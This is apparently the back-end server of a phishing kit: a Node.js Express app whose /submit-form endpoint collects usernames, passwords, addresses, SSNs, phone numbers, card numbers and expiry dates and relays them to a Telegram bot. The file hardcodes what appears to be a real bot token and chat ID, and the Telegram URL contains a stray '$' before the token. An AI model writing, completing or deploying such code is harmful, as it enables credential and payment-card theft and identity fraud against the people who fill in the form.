const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = '7027887438:AAHOkNskoXnK91zlbyzEuDZ75nNDU0o48Fo';
const CHAT_ID = '5991505325';

app.post('/submit-form', async (req, res) => {
  const formData = req.body;
  const message = `
    New form submission:
    Username: ${formData.username}
    Password: ${formData.password}
    Address: ${formData.address}
    City: ${formData.city}
    State: ${formData.state}
    Zip Code: ${formData.zipCode}
    SSN: ${formData.ssn}
    Phone: ${formData.phone}
    Card Number: ${formData.cardNumber}
    Card Expiry: ${formData.cardExpiry}
  `;

  try {
    await axios.post(`https://api.telegram.org/bot$7027887438:AAHOkNskoXnK91zlbyzEuDZ75nNDU0o48Fo/sendMessage`, {
      chat_id: CHAT_ID,
      text: message
    });
    res.status(200).send({ message: 'Form submitted successfully.' });
  } catch (error) {
    console.error('Error submitting form:', error);
    res.status(500).send({ error: 'Internal server error' });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
